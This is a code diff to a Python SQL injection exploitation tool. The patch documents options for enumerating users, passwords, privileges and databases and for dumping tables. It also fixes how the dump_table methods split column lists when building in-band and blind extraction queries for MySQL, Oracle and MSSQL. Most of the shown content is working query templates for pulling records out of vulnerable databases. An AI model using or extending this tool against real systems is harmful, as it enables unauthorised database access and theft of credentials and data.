@@ -80,7 +80,6 @@ class Timing:
 
   def __exit__(self, exc_type, exc_value, traceback):
     self.time = time() - self.t1
-
 # }}}
 
 # Requester {{{
@@ -428,29 +427,29 @@ class SQLi_Base:
 
     parser.add_option('-d', '--debug', dest='debug', action='store_true', default=False, help='print debug messages')
     parser.add_option('-q', '--query', dest='query', help='SQL statement to execute')
-    parser.add_option('-b', '--banner', dest='banner', action='store_true', help='')
-    parser.add_option('--current-user', dest='current_user', action='store_true', help='')
-    parser.add_option('--current-db', dest='current_db', action='store_true', help='')
-    parser.add_option('--hostname', dest='hostname', action='store_true', help='')
+    parser.add_option('-b', '--banner', dest='banner', action='store_true', help='return banner')
+    parser.add_option('--current-user', dest='current_user', action='store_true', help='return current user')
+    parser.add_option('--current-db', dest='current_db', action='store_true', help='return current database')
+    parser.add_option('--hostname', dest='hostname', action='store_true', help='return server hostname')
 
-    parser.add_option('--privileges', dest='enum_privileges', action='store_true', help='')
-    parser.add_option('--roles', dest='enum_roles', action='store_true', help='')
+    parser.add_option('--privileges', dest='enum_privileges', action='store_true', help='return user privileges')
+    parser.add_option('--roles', dest='enum_roles', action='store_true', help='return user roles')
 
-    parser.add_option('--users', dest='enum_users', action='store_true', help='')
-    parser.add_option('--passwords', dest='enum_passwords', action='store_true', help='')
+    parser.add_option('--users', dest='enum_users', action='store_true', help='return user names')
+    parser.add_option('--passwords', dest='enum_passwords', action='store_true', help='return user passwords')
 
-    parser.add_option('--dbs', dest='enum_dbs', action='store_true', help='')
-    parser.add_option('--tables', dest='enum_tables', action='store_true')
-    parser.add_option('--columns', dest='enum_columns', action='store_true')
-    parser.add_option('--dump', dest='dump_table', action='store_true', help='')
+    parser.add_option('--dbs', dest='enum_dbs', action='store_true', help='return database names')
+    parser.add_option('--tables', dest='enum_tables', action='store_true', help='return table names')
+    parser.add_option('--columns', dest='enum_columns', action='store_true', help='return column names')
+    parser.add_option('--dump', dest='dump_table', action='store_true', help='return table records')
 
-    parser.add_option('-D', dest='db', default='', metavar='', help='')
-    parser.add_option('-T', dest='table', default='', metavar='', help='')
-    parser.add_option('-C', dest='column', default='', metavar='', help='')
-    parser.add_option('-U', dest='user', default='', metavar='', help='')
+    parser.add_option('-D', dest='db', default='', metavar='d1[,dN]*', help='database(s) to select')
+    parser.add_option('-T', dest='table', default='', metavar='t1[,tN]*', help='table(s) to select')
+    parser.add_option('-C', dest='column', default='', metavar='c1[,cN]*', help='column(s) to select')
+    parser.add_option('-U', dest='user', default='', metavar='u1[,uN]*', help='user(s) to select')
 
-    parser.add_option('--start', dest='start_offset', default='0', metavar='', help='')
-    parser.add_option('--stop', dest='stop_offset', default='1', metavar='', help='')
+    parser.add_option('--start', dest='start_offset', default='0', metavar='N', help='offset to start dump at')
+    parser.add_option('--stop', dest='stop_offset', default='1', metavar='N', help='offset to stop dump at')
 
     (opts, args) = parser.parse_args(argv[1:])
 
@@ -517,7 +516,6 @@ class SQLi_Base:
         print
 
     logger.info("Time: %s" % pprint_seconds(timing.time, '%dh %dm %ds'))
-
 # }}}
 
 # MySQL_Inband {{{
@@ -589,10 +587,10 @@ class MySQL_Inband(SQLi_Base):
 
   def dump_table(self, db, table, cols):
     if not (db and table and cols):
-      raise NotImplementedError('-D, -T and -U required')
+      raise NotImplementedError('-D, -T and -C required')
 
     c = '(SELECT COUNT(*) X FROM %s.%s)a' % (db, table)
-    q = '(SELECT CONCAT_WS(0x3a,%s) X FROM %s.%s LIMIT ${row_pos},${row_count})a' % (','.join(cols), db, table)
+    q = '(SELECT CONCAT_WS(0x3a,%s) X FROM %s.%s LIMIT ${row_pos},${row_count})a' % (','.join(cols.split(',')), db, table)
     return c, q
 # }}}
 
@@ -664,10 +662,10 @@ class MySQL_Blind(SQLi_Base):
 
   def dump_table(self, db, table, cols):
     if not (db and table and cols):
-      raise NotImplementedError('-D, -T and -U required')
+      raise NotImplementedError('-D, -T and -C required')
 
     c = 'SELECT COUNT(*) FROM %s.%s' % (db, table)
-    q = 'SELECT CONCAT_WS(0x3a,%s) FROM %s.%s LIMIT ${row_pos},1' % (','.join(cols), db, table)
+    q = 'SELECT CONCAT_WS(0x3a,%s) FROM %s.%s LIMIT ${row_pos},1' % (','.join(cols.split(',')), db, table)
     return c, q
 # }}}
 
@@ -751,12 +749,11 @@ class Oracle_Inband(SQLi_Base):
 
     if db:
       c = '(SELECT UPPER(COUNT(*)) X FROM %s.%s)' % (db, table)
-      q = '(SELECT %s X,ROWNUM R FROM %s.%s) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}' % ('||chr(58)||'.join(cols), db, table)
+      q = '(SELECT %s X,ROWNUM R FROM %s.%s) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}' % ('||chr(58)||'.join(cols.split(',')), db, table)
     else:
       c = '(SELECT UPPER(COUNT(*)) X FROM %s)' % table
-      q = '(SELECT %s X,ROWNUM R FROM %s) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}' % ('||chr(58)||'.join(cols), table)
+      q = '(SELECT %s X,ROWNUM R FROM %s) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}' % ('||chr(58)||'.join(cols.split(',')), table)
     return c, q
-
 # }}}
 
 # Oracle_Blind {{{
@@ -826,12 +823,11 @@ class Oracle_Blind(SQLi_Base):
 
   def dump_table(self, db, table, cols):
     if not (db and table and cols):
-      raise NotImplementedError('-D, -T and -U required')
+      raise NotImplementedError('-D, -T and -C required')
 
     c = "SELECT COUNT(*) FROM %s" % table.upper()
-    q = "SELECT X FROM (SELECT %s X,ROWNUM-1 R FROM %s) WHERE R=${row_pos}" % ('||chr(58)||'.join(cols), table.upper())
+    q = "SELECT X FROM (SELECT %s X,ROWNUM-1 R FROM %s) WHERE R=${row_pos}" % ('||chr(58)||'.join(cols.split(',')), table.upper())
     return c, q
-
 # }}}
 
 # MSSQL_Inband {{{
@@ -887,13 +883,12 @@ class MSSQL_Inband(SQLi_Base):
 
   def dump_table(self, db, table, cols):
     if not (db and table and cols):
-      raise NotImplementedError('-D, -T and -U required')
+      raise NotImplementedError('-D, -T and -C required')
 
     c = T('(SELECT LTRIM(STR(COUNT(*))) X FROM ${db}..${table})a', db=db, table=table)
     q = T('(SELECT TOP ${row_count} ${cols} X FROM ${db}..${table} WHERE ${cols}' \
-          ' NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table}))a', cols="+char(58)+".join('CAST(%s AS NVARCHAR(4000))' % c for c in cols), db=db, table=table) # FIXME no need to have cols everywhere?
+          ' NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table}))a', cols="+char(58)+".join('CAST(%s AS NVARCHAR(4000))' % c for c in cols.split(',')), db=db, table=table) # FIXME no need to have cols everywhere?
     return c, q
-
 # }}}
 
 # MSSQL_Blind {{{
@@ -956,7 +951,7 @@ class MSSQL_Blind(SQLi_Base):
 
     c = T("SELECT LTRIM(STR(COUNT(*))) FROM ${db}..${table}", db=db, table=table)
     q = T("SELECT TOP 1 ${cols} FROM ${db}..${table} WHERE ${cols}" \
-          " NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table} ORDER BY 1) ORDER BY 1", cols="+char(58)+".join(cols), table=table, db=db)
+          " NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table} ORDER BY 1) ORDER BY 1", cols="+char(58)+".join(cols.split(',')), table=table, db=db)
     return c, q
 # }}}
 
